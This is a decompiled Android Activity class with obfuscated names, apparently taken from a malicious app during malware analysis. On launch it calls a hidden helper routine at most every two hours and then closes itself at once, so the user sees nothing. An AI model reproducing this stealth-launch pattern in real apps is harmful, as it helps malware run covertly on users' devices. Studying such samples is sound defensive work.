package com.zjxyxnvvp.nxvxchltf;

import android.app.Activity;
import android.os.Bundle;
import com.zjxyxnvvp.nxvxchltf.util.b;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class nawIODnaiowdna extends Activity {

    /* renamed from: a  reason: collision with root package name */
    static long f349a;

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (System.currentTimeMillis() - f349a > 7200000) {
            b.w(this);
            f349a = System.currentTimeMillis();
        }
        finishAffinity();
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        finish();
    }

    @Override // android.app.Activity
    protected void onPause() {
        super.onPause();
        finish();
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        finish();
    }
}
